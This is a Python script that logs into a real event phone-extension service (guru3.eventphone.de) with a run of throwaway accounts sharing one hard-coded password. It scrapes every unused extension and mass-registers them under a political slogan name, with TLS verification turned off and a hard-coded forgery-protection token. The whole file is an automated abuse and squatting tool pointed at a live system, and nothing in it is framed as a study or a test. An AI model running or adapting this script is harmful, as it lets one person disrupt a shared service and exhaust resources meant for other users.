#free palestine script

from bs4 import BeautifulSoup
import requests
import json
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
username = "chuckie_69";
password = "pwned_by_swagydog";

URL = "https://guru3.eventphone.de/extension.jsf/new?debug=false"
def get_login_token(session):
    res = session.get("https://guru3.eventphone.de/accounts/login.cgi")
    soup = BeautifulSoup(res.text, 'html.parser')
    csrf = soup.find('input', {'name': 'csrfmiddlewaretoken'})['value']
    return csrf

def login(user, pw):
    s = requests.Session()
    token = get_login_token(s)
    print(token)
    data = {
            "csrfmiddlewaretoken": token,
            "username": user,
            "password": pw,
            "next": ""
            }
    res = s.post("https://guru3.eventphone.de/accounts/login.cgi", headers={'Referer': 'https://guru3.eventphone.de/accounts/login.cgi'}, data=data)
    print("logged in as " + user)
    return s

def get_tokens(session):
    res = session.get("https://guru3.eventphone.de/extension.jsf/new")
    soup = BeautifulSoup(res.text, 'html.parser')
    csrf = soup.find('input', {'name': 'csrfmiddlewaretoken'})['value']
    return csrf

#gets unused extensions
def get_lol(session):
    res = session.get("https://guru3.eventphone.de/extension.so/unused/112")
    soup = BeautifulSoup(res.text, 'html.parser')
    number = soup.find("p", id="extensions").find_all("span")
    return [x.get_text() for x in number];

def go_crazy(username, password):
    session = login(username, password);
    csrf = get_tokens(session);
    lol = get_lol(session);
    headers = {

    "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",

    "Accept-Encoding":"gzip,deflate,br,zstd",

    "Accept-Language":"en-US,en;q=0.5",

    "Connection":"keep-alive",

    "Content-Length":"406",

    "Content-Type":"application/x-www-form-urlencoded",

    "Sec-GPC":"1",

    "Connection":"keep-alive",

    "Origin":"https://guru3.eventphone.de",

    "Upgrade-Insecure-Requests":"1",

    "Referer":"https://guru3.eventphone.de/extension.jsf/new?debug=false",

    "Sec-Fetch-Dest":"document",

    "Sec-Fetch-Mode":"navigate",

    "Sec-Fetch-Site":"same-origin",

    "Sec-Fetch-User":"?1",

    "Sec-GPC":"1",

    "Priority":"i=0, i",

    "User-Agent":"Mozilla/5.0(X11;Linuxx86_64;rv:144.0)Gecko/20100101Firefox/144.0",

    "X-Forgery-Protection-Token":"bf61e9389c4eb13778a0f980d4c9ec71",

    "X-Requested-With":"XMLHttpRequest"
            }

    

    for val in lol:
        data = {
             "csrfmiddlewaretoken": csrf,
        
             "type": "SIP",
            
             "extension": val,

             "name": "free_palestine",
             
             "location": "occupied_gaza",

             "announcement_lang": "de-DE",

             "ringback_tone": "",

             "inPhonebook": "on",
             
             "call_waiting": "on",

             "next_url": "",

             "diplayModus": "NUMBER_NAME",

             "handset": "",

             "twoGOptIn": "on",

             "fourGOptIn": "on",

             "group_shortcode": "",

             "announcement_audio": "",

             "forward_mode": "DISABLED",

             "forward_extension": "",

             "forward_delay": "0",

             "mask_as_outgoing_extension": "",

             "save": "Save"
             }
        
        r = session.post(url=URL, headers=headers, data=data, verify=False)
        print("trying " + str(val))
        if ("correct your inputs" not in r.text):
            print("yippeeeee  worked!")
        else:
            print("account burnt")
            break;

for i in range(69,120):
    go_crazy("chuckie_"+str(i), password)
